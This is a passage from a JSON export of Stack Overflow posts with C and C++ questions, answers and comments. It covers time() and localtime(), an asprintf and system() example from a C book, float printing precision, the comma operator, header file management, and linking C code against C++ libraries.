doing:</p>\n\n<pre><code>tmptr = localtime(&amp;t);\n</code></pre>\n\n<p>The complete code is:</p>\n\n<pre><code>main() {\n    char dateString[20], timeString[20];\n    struct tm *tmptr;\n    time_t t;\n    t = time(NULL);\n    tmptr = localtime(&amp;t);\n    strftime(dateString, 20, \"%F\",tmptr)\n    printf(\"%s %s\\n\",dateString,timeString);\n}\n</code></pre>\n\n<p>I understand that the function <code>time(NULL)</code> gives the time in seconds from the UNIX Epoch. But I do not understand why:</p>\n\n<ol>\n<li><code>NULL</code> passed in <code>time()</code>? What if I pass a non-null value? I couldn't understand the man page here.</li>\n<li>What does the <code>localtime()</code> actually do here?</li>\n</ol>\n"}, {"tags": ["c", "string", "asprintf"], "comments": [{"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1482912822, "post_id": 41357961, "comment_id": 69917363, "body": "And the question is...?"}, {"owner": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "reply_to_user": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1482912935, "post_id": 41357961, "comment_id": 69917401, "body": "Question is : Why it is not talking the string input from keyboard as it supposed ?"}, {"owner": {"reputation": 15221, "user_id": 1023911, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Wln26.jpg?s=128&g=1", "display_name": "Werner Henze", "link": "https://stackoverflow.com/users/1023911/werner-henze"}, "edited": false, "score": 1, "creation_date": 1482913557, "post_id": 41357961, "comment_id": 69917624, "body": "@Chandra Please put your question into the question post and do not hide it in a comment."}, {"owner": {"reputation": 15221, "user_id": 1023911, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Wln26.jpg?s=128&g=1", "display_name": "Werner Henze", "link": "https://stackoverflow.com/users/1023911/werner-henze"}, "edited": false, "score": 3, "creation_date": 1482913703, "post_id": 41357961, "comment_id": 69917673, "body": "Why are you posting the same code twice? Why are you posting a screenshot of the book? Is it necessary? Don&#39;t you violate the copyright doing so?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482913898, "post_id": 41357961, "comment_id": 69917766, "body": "<code>strings</code> does not get &quot;string input from keyboard as it supposed&quot;. It searches text files for strings. You have passed it the name of an executable and it found nothing."}, {"owner": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "edited": false, "score": 0, "creation_date": 1482931877, "post_id": 41357961, "comment_id": 69927457, "body": "yes, i am aware of  copy right violation . but it wish to give a context to the question. Later i will  ask the author the permission. In the same time,  believe it no harm."}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "edited": false, "score": 0, "creation_date": 1482937281, "post_id": 41358090, "comment_id": 69930521, "body": "yes, got the idea. but when i tried the above code ,the program exit. but the argv fixed value i.e argv[2].  then got                                                 sh: 1: Syntax error: word unexpected (expecting &quot;)&quot;) Something  went Wrong  strings (null)."}, {"owner": {"reputation": 15221, "user_id": 1023911, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Wln26.jpg?s=128&g=1", "display_name": "Werner Henze", "link": "https://stackoverflow.com/users/1023911/werner-henze"}, "reply_to_user": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "edited": false, "score": 0, "creation_date": 1482940884, "post_id": 41358090, "comment_id": 69932543, "body": "@Chandra <code>argv[2]</code> is only available if argc&gt;2 and if you passed 2 strings to your program when calling it."}], "tags": [], "owner": {"reputation": 15221, "user_id": 1023911, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Wln26.jpg?s=128&g=1", "display_name": "Werner Henze", "link": "https://stackoverflow.com/users/1023911/werner-henze"}, "is_accepted": false, "score": 1, "last_activity_date": 1482934845, "last_edit_date": 1482934845, "creation_date": 1482913477, "answer_id": 41358090, "question_id": 41357961, "link": "https://stackoverflow.com/questions/41357961/asprintf-how-to-get-string-input-in-c/41358090#41358090", "title": "asprintf - how to get string input in C", "body": "<p>There is no place in your program where it reads from standard input/keyboard. And the <code>system(\"strings ...\")</code> is passing a filename to the <code>strings</code> command, so <code>strings</code> reads from that file and not from keyboard.</p>\n\n<p>If you intend to read from the files with the filenames passed to your program you need to keep in mind that <code>argv[0]</code>is the program name. You need to look at <code>argv[1]</code>, <code>argv[2]</code> and so on.</p>\n\n<pre><code>for(int i = 1; i &lt; argc; ++i)\n    get_strings(argv[i]);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "edited": false, "score": 0, "creation_date": 1482935553, "post_id": 41358267, "comment_id": 69929528, "body": "Agree. after the reading book carefully, System command to run a external utility.The thematically appropriate utility,strings,searches  a binary for printable plain text.  No wonder it receive the name of program  because of argv[0]. It is slightly advance concept for me. Thanks"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "edited": false, "score": 0, "creation_date": 1484402572, "post_id": 41358267, "comment_id": 70500303, "body": "@Chandra: you can accept this answer by clicking on the grey checkmark below its score."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 3, "last_activity_date": 1482914305, "creation_date": 1482914305, "answer_id": 41358267, "question_id": 41357961, "link": "https://stackoverflow.com/questions/41357961/asprintf-how-to-get-string-input-in-c/41358267#41358267", "title": "asprintf - how to get string input in C", "body": "<p>The purpose of the program is not to get input from the user: it uses the <code>system()</code> function to run the <code>strings</code> program with its own name as the only argument.</p>\n\n<p>If you are running on a Unix environment, the <code>strings</code> program scans files for printable strings. The output you observe is more of less expected: your program executable as produced by <code>gcc</code> contains many printable strings:</p>\n\n<ul>\n<li>you can spot the string literal present in the source code:\n    Something  went Wrong  %s.</li>\n<li>numerous symbol names to be resolved dynamically at load time</li>\n<li>debugging information, such as the name of the source file: <code>crtstuff.c</code></li>\n<li>section names starting with <code>.</code></li>\n<li>there are also some random items (<code>[]A\\A]A^A_</code>, <code>;*3$\"</code>...) that are just sequences of printable characters present in the executable file code or binary data, mistakenly interpreted by <code>string</code> as C strings because they are followed by a null byte.</li>\n</ul>\n"}], "owner": {"reputation": 35, "user_id": 581248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TLzIH.jpg?s=128&g=1", "display_name": "Chandra", "link": "https://stackoverflow.com/users/581248/chandra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 758, "favorite_count": 0, "closed_date": 1482917309, "accepted_answer_id": 41358267, "answer_count": 2, "score": -2, "last_activity_date": 1483431561, "creation_date": 1482912750, "last_edit_date": 1483431561, "question_id": 41357961, "link": "https://stackoverflow.com/questions/41357961/asprintf-how-to-get-string-input-in-c", "closed_reason": "Needs details or clarity", "title": "asprintf - how to get string input in C", "body": "<p>I am reading the book <strong>\"21 century C\"</strong> (first editon) and find a interesting program using asprintf\nto get the string without using  malloc /size of  for string length or space allocation. Please read the attached image from the same book to understand the context.Following program also from book. The program compile run and NOT taking string input from keyboard instead getting following message. Question is : Why the program doesn't take string input from keboard instead the showing long (unusual) error message?     </p>\n\n<pre><code>#define _GNU_SOURCE  // stdio.h to include asprintf\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid get_strings(char const *in) {\n    char *cmd;\n    asprintf(&amp;cmd, \"strings %s\", in);\n    if (system(cmd))\n        fprintf(stderr, \"Something went Wrong  %s.\\n\", cmd);\n    free(cmd);\n} \n\nint main(int argc, char **argv) {\n    get_strings(argv[0]);   \n    //return 0;\n}\n</code></pre>\n\n<p>When the run the program the output is :</p>\n\n<pre><code>/lib64/ld-linux-x86-64.so.2\nlibc.so.6\n__stack_chk_fail\nasprintf\nstderr\nsystem\nfprintf\n__libc_start_main\nfree\n__gmon_start__\nGLIBC_2.4\nGLIBC_2.2.5\nUH-X\nAWAVA\nAUATL\n[]A\\A]A^A_\nstrings %s\nSomething  went Wrong  %s.\n;*3$\"\nGCC: (Ubuntu 5.3.1-14ubuntu2) 5.3.1 20160413\ncrtstuff.c\n__JCR_LIST__\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.7585\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nget_strings.c\n__FRAME_END__\n__JCR_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\nfree@@GLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n_edata\n__stack_chk_fail@@GLIBC_2.4\nsystem@@GLIBC_2.2.5\nget_strings\n__libc_start_main@@GLIBC_2.2.5\n__data_start\nfprintf@@GLIBC_2.2.5\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n__libc_csu_init\n__bss_start\nasprintf@@GLIBC_2.2.5\nmain\n_Jv_RegisterClasses\n__TMC_END__\n_ITM_registerTMCloneTable\nstderr@@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.ABI-tag\n.note.gnu.build-id\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.jcr\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n\n\n------------------\n(program exited with code: 0)\nPress return to continue\n\n**I running it on Linux Mint 18. GCC version -5.3.1\nBuild setting - gcc -Wall   -c \"%f\"\nCompile -       gcc -Wall   -o \"%e\"   \"%f\"**\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/oLzfm.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/oLzfm.jpg\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["c", "floating-point", "printf"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1482911482, "post_id": 41357663, "comment_id": 69916847, "body": "See the duplicate. Yes this is bewildering when you first encounter it. Nothing wrong with the way you&#39;ve posed the question though."}, {"owner": {"reputation": 13302, "user_id": 4082217, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/15ad55dad62ce17d0852311c0e3fa92c?s=128&d=identicon&r=PG&f=1", "display_name": "Mohammad Yusuf", "link": "https://stackoverflow.com/users/4082217/mohammad-yusuf"}, "edited": false, "score": 0, "creation_date": 1482911517, "post_id": 41357663, "comment_id": 69916860, "body": "Detailed: <a href=\"https://en.wikipedia.org/wiki/Floating_point\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Floating_point</a> :D"}], "owner": {"reputation": 31, "user_id": 3162308, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/608758356/picture?type=large", "display_name": "user3162308", "link": "https://stackoverflow.com/users/3162308/user3162308"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 39, "favorite_count": 0, "closed_date": 1482911458, "answer_count": 0, "score": 0, "last_activity_date": 1482911406, "creation_date": 1482911375, "last_edit_date": 1482911406, "question_id": 41357663, "link": "https://stackoverflow.com/questions/41357663/printf-of-float-type-returns-wrong-value", "closed_reason": "Duplicate", "title": "printf of &#39;Float&#39; type returns wrong value", "body": "<p>I'm trying to printf the following number:</p>\n\n<pre><code>Float val = 500.5080;\n\nprintf(\"%f\",val);\n</code></pre>\n\n<p>Why the printed value i'm getting is <strong><code>500.507996</code></strong> ? I will be glad for a detailed explanation.</p>\n"}, {"tags": ["c++", "c", "visual-c++"], "comments": [{"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 1, "creation_date": 1482910011, "post_id": 41357290, "comment_id": 69916115, "body": "Don&#39;t post code and results in images, it&#39;s a PITA to see on mobile devices, and to try your code in a compiler as well. -1 until you fix it."}, {"owner": {"reputation": 47, "user_id": 5154852, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-5mDoNHTUZP0/AAAAAAAAAAI/AAAAAAAAAIM/FpENV8E0RDo/photo.jpg?sz=128", "display_name": "Tr\u1ea7n H\u1ed3ng Ph&#225;t", "link": "https://stackoverflow.com/users/5154852/tr%e1%ba%a7n-h%e1%bb%93ng-ph%c3%a1t"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1482910222, "post_id": 41357290, "comment_id": 69916234, "body": "OK, So sorry about that."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 1, "creation_date": 1482910276, "post_id": 41357290, "comment_id": 69916256, "body": "Downvote retracted."}], "answers": [{"comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 47, "user_id": 5154852, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-5mDoNHTUZP0/AAAAAAAAAAI/AAAAAAAAAIM/FpENV8E0RDo/photo.jpg?sz=128", "display_name": "Tr\u1ea7n H\u1ed3ng Ph&#225;t", "link": "https://stackoverflow.com/users/5154852/tr%e1%ba%a7n-h%e1%bb%93ng-ph%c3%a1t"}, "edited": false, "score": 1, "creation_date": 1482910421, "post_id": 41357312, "comment_id": 69916328, "body": "@Tr\u1ea7nH\u1ed3ngPh&#225;t - You should accept this answer, since it helped you and it&#39;s spot on."}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": true, "score": 6, "last_activity_date": 1482910120, "last_edit_date": 1482910120, "creation_date": 1482909961, "answer_id": 41357312, "question_id": 41357290, "link": "https://stackoverflow.com/questions/41357290/variable-assignment-and-the-comma-operator/41357312#41357312", "title": "Variable assignment and the comma operator", "body": "<p>The two statements are both evaluated as</p>\n\n<pre><code>c = a;\nd = b;\n</code></pre>\n\n<p>due to how the <em>comma</em> operator (which has the lowest precedence of any operator) works in C and C++.</p>\n\n<p>For the first one, <code>c = a</code> is evaluated first (as <code>=</code> has higher precedence than the comma operator) then <code>b</code> (which is a no-op) is evaluated. The <em>entire expression</em> has a value <code>b</code> but that's not assigned to anything.</p>\n\n<p>For <code>d = (a, b);</code>, <code>(a, b)</code> is first evaluated due to the parentheses. This has a value <code>b</code>, and that is assigned to <code>d</code>.</p>\n"}], "owner": {"reputation": 47, "user_id": 5154852, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-5mDoNHTUZP0/AAAAAAAAAAI/AAAAAAAAAIM/FpENV8E0RDo/photo.jpg?sz=128", "display_name": "Tr\u1ea7n H\u1ed3ng Ph&#225;t", "link": "https://stackoverflow.com/users/5154852/tr%e1%ba%a7n-h%e1%bb%93ng-ph%c3%a1t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 215, "favorite_count": 0, "closed_date": 1482910037, "accepted_answer_id": 41357312, "answer_count": 1, "score": -1, "last_activity_date": 1482910302, "creation_date": 1482909869, "last_edit_date": 1482910302, "question_id": 41357290, "link": "https://stackoverflow.com/questions/41357290/variable-assignment-and-the-comma-operator", "closed_reason": "Duplicate", "title": "Variable assignment and the comma operator", "body": "<p>Can anybody explain for me:</p>\n\n<pre><code>int a, b, c, d;\na = 2;\nb = 4;\nc = a, b;\nd = (a, b);\n</code></pre>\n\n<p>Why <code>c == 2</code> and <code>d == 4</code> ???</p>\n"}, {"tags": ["c", ".so", ".a"], "answers": [{"comments": [{"owner": {"reputation": 101, "user_id": 6387217, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153586523548314/picture?type=large", "display_name": "ErikJL", "link": "https://stackoverflow.com/users/6387217/erikjl"}, "edited": false, "score": 0, "creation_date": 1482936245, "post_id": 41356365, "comment_id": 69929898, "body": "Thank you. You&#39;re right about cmake, I saw tried to decipher a cmake file once and it was a nightmare! I suppose I should take a run at it with a tutorial."}, {"owner": {"reputation": 6034, "user_id": 4460500, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/7TTnO.jpg?s=128&g=1", "display_name": "VolAnd", "link": "https://stackoverflow.com/users/4460500/voland"}, "reply_to_user": {"reputation": 101, "user_id": 6387217, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153586523548314/picture?type=large", "display_name": "ErikJL", "link": "https://stackoverflow.com/users/6387217/erikjl"}, "edited": false, "score": 0, "creation_date": 1482946589, "post_id": 41356365, "comment_id": 69935425, "body": "You should try and you can ask questions about cmake when issues arise"}], "tags": [], "owner": {"reputation": 6034, "user_id": 4460500, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/7TTnO.jpg?s=128&g=1", "display_name": "VolAnd", "link": "https://stackoverflow.com/users/4460500/voland"}, "is_accepted": false, "score": 3, "last_activity_date": 1482906595, "last_edit_date": 1482906595, "creation_date": 1482905615, "answer_id": 41356365, "question_id": 41355980, "link": "https://stackoverflow.com/questions/41355980/user-defined-c-and-h-file-management/41356365#41356365", "title": "User defined .c and .h file management", "body": "<p>Actually, both ways (prepare object files and use headers with them when compile program, and add source code and headers to each project with full or relative path) are quite normal. You should choose a way that is convenient for you. I do not know how Codeblocks works, but I suppose that as most IDE it can support dependencies, optimize build time and rebuild libraries (components of complex project) if some files were updated.</p>\n\n<p>My suggestion is to consider some project build tools (project makers) like cmake. You will be able to configure building process for any project and to use different compilers, as well as different compiling options for different projects, while source files (*.c and *.h) storage is unchanged.</p>\n\n<p>Start from <a href=\"https://cmake.org/cmake-tutorial/\" rel=\"nofollow noreferrer\">cmake tutorial</a> and other <a href=\"https://cmake.org/documentation/\" rel=\"nofollow noreferrer\">documentation</a></p>\n\n<p>Of course, at first it will be not easy to deal with the makefile syntax, but when you get used to it you will realize how much it's convenient.</p>\n"}, {"tags": [], "owner": {"reputation": 10223, "user_id": 7032856, "user_type": "registered", "accept_rate": 81, "profile_image": "https://lh6.googleusercontent.com/-v2P-pqI1pww/AAAAAAAAAAI/AAAAAAAAABg/BHOFSOpQ0BM/photo.jpg?sz=128", "display_name": "Nae", "link": "https://stackoverflow.com/users/7032856/nae"}, "is_accepted": false, "score": 0, "last_activity_date": 1482917295, "last_edit_date": 1482917295, "creation_date": 1482906245, "answer_id": 41356476, "question_id": 41355980, "link": "https://stackoverflow.com/questions/41355980/user-defined-c-and-h-file-management/41356476#41356476", "title": "User defined .c and .h file management", "body": "<p>I think it is possible to include headers from their exact source, on a linux platform at least.</p>\n\n<p>assume that you put your *.h in /usr/include you can just use</p>\n\n<pre><code>#include \"/usr/include/*.h\"\n</code></pre>\n\n<p>w/o moving your source files you can add the same chunk of code to every new sources you write, but VolAnd's above mentioned suggestions are probably more standard ways of managing.</p>\n"}], "owner": {"reputation": 101, "user_id": 6387217, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153586523548314/picture?type=large", "display_name": "ErikJL", "link": "https://stackoverflow.com/users/6387217/erikjl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1482917295, "creation_date": 1482903496, "question_id": 41355980, "link": "https://stackoverflow.com/questions/41355980/user-defined-c-and-h-file-management", "title": "User defined .c and .h file management", "body": "<p>I am building a small library of my own *.c &amp; *.h files and am not sure how I should manage them, especially when including them into a project. I'm using Codeblocks on Ubuntu in case that matters. For each .c/.h file pair, I have a Codeblocks project that is a playground where I can modify &amp; test out any changes or newfound bugs.</p>\n\n<p>I'm thinking I should compile the .c into libraries (.a/.so), put them into respective custom 'XXX/bin' and 'XXX/include' folders, and include/link from those locations (add to the PATH).</p>\n\n<p>The other option (which I've been doing for right or wrong) is to add the .c file directly to my project and #include the full path of the .h file (I know this is wrong, but it works).</p>\n\n<p>How do you all manage your .c and .h files? </p>\n"}, {"tags": ["c++", "c", "gcc"], "comments": [{"owner": {"reputation": 405, "user_id": 4113567, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/1c2d5d227d9b52a82e06e33235fd81e1?s=128&d=identicon&r=PG&f=1", "display_name": "marshal craft", "link": "https://stackoverflow.com/users/4113567/marshal-craft"}, "edited": false, "score": 1, "creation_date": 1482902528, "post_id": 41355767, "comment_id": 69913321, "body": "Why would a c compiler know how to compile c++ components. Maybe you need to compile the c++ component fully then link the binaries."}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 0, "creation_date": 1482902548, "post_id": 41355767, "comment_id": 69913330, "body": "This question looks like a dupe of those you linked to. The answers describe general possible solutions, and you need to implement them in your concrete code, that&#39;s all."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1482902574, "post_id": 41355767, "comment_id": 69913338, "body": "Use <code>g++</code> to link the code (not <code>gcc</code> \u2014 the program is a C++ program because it has some C++ in it).  It is usually better to use <code>g++</code> to compile the file containing <code>main()</code> since that has special properties in C++ (unlike in C), though you may get away with using a C compiler to create the object file holding <code>main()</code>."}, {"owner": {"reputation": 473, "user_id": 2935155, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/987d5791e3b9e6c9ce5fb52f305b98ee?s=128&d=identicon&r=PG&f=1", "display_name": "Saqib Shamsi", "link": "https://stackoverflow.com/users/2935155/saqib-shamsi"}, "reply_to_user": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 0, "creation_date": 1482902941, "post_id": 41355767, "comment_id": 69913482, "body": "@ForceBru In those questions, STL components haven&#39;t been used. I got the error I mentioned when I tried those approaches. However, it worked for programs that don&#39;t contain STL components but not for the ones containing them."}, {"owner": {"reputation": 473, "user_id": 2935155, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/987d5791e3b9e6c9ce5fb52f305b98ee?s=128&d=identicon&r=PG&f=1", "display_name": "Saqib Shamsi", "link": "https://stackoverflow.com/users/2935155/saqib-shamsi"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482903078, "post_id": 41355767, "comment_id": 69913524, "body": "@JonathanLeffler Compiling with <code>g++</code> works. However, as I mentioned that it is really important that I use <code>gcc</code> for the file containing the <code>main</code> function. I was hoping there was a way around."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1482903762, "post_id": 41355767, "comment_id": 69913761, "body": "You can try compiling <code>main.c</code> to <code>main.o</code> with <code>gcc</code>, then linking with <code>g++ -o program main.o mylib.o</code> \u2014 you may be lucky and get away with that. Failing that, create <code>cpp-main.cpp</code> containing <code>extern &quot;C&quot; int c_main(); int main() { return c_main(); }</code> (or <code>extern &quot;C&quot; int c_main(int argc, char **argv); int main(int argc, char **argv) { return c_main(argc, argv); }</code>) and compile that with <code>g++</code>. In the existing <code>main.c</code>, change the function to <code>int c_main(void) { \u2026your code\u2026 }</code> (or the equivalent with arguments), not forgetting to declare the function (since it is no longer called <code>main()</code>)."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 5, "creation_date": 1482903930, "post_id": 41355767, "comment_id": 69913798, "body": "The crucial point is to link the program with <code>g++</code> so that you get the correct C++ libraries linked.  Linking with <code>gcc</code> will be a painful exercise by comparison.  In case of doubt, try using <code>g++ -v</code> and <code>gcc -v</code> to do the different linking operations, and see how much difference there is in the commands invoked to do the linking."}, {"owner": {"reputation": 61, "user_id": 5784006, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aoiGW.jpg?s=128&g=1", "display_name": "saeid zamani", "link": "https://stackoverflow.com/users/5784006/saeid-zamani"}, "edited": false, "score": 0, "creation_date": 1482906481, "post_id": 41355767, "comment_id": 69914680, "body": "This is same question. Maybe help you. <a href=\"http://stackoverflow.com/questions/11580968/c-and-c-linkage-with-extern-c\">See here</a>"}, {"owner": {"reputation": 42006, "user_id": 3807729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UEUbF.jpg?s=128&g=1", "display_name": "Galik", "link": "https://stackoverflow.com/users/3807729/galik"}, "edited": false, "score": 0, "creation_date": 1482907971, "post_id": 41355767, "comment_id": 69915292, "body": "You need to use <code>extern &quot;C&quot;</code> in <code>mylib.h</code> <b>and</b> the <code>mylib.cpp</code> file. Also link against the <code>C++</code> runtime library <code>-lstdc++</code> (I think)"}, {"owner": {"reputation": 42006, "user_id": 3807729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UEUbF.jpg?s=128&g=1", "display_name": "Galik", "link": "https://stackoverflow.com/users/3807729/galik"}, "edited": false, "score": 0, "creation_date": 1482908247, "post_id": 41355767, "comment_id": 69915396, "body": "This answer should help: <a href=\"https://stackoverflow.com/questions/31903005/how-to-mix-c-and-c-correctly/31903685#31903685\" title=\"how to mix c and c correctly\">stackoverflow.com/questions/31903005/&hellip;</a>"}, {"owner": {"reputation": 42006, "user_id": 3807729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UEUbF.jpg?s=128&g=1", "display_name": "Galik", "link": "https://stackoverflow.com/users/3807729/galik"}, "edited": false, "score": 0, "creation_date": 1482908325, "post_id": 41355767, "comment_id": 69915416, "body": "In fact possible duplicate of <a href=\"https://stackoverflow.com/questions/31903005/how-to-mix-c-and-c-correctly\" title=\"how to mix c and c correctly\">stackoverflow.com/questions/31903005/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 5732970, "user_type": "registered", "profile_image": 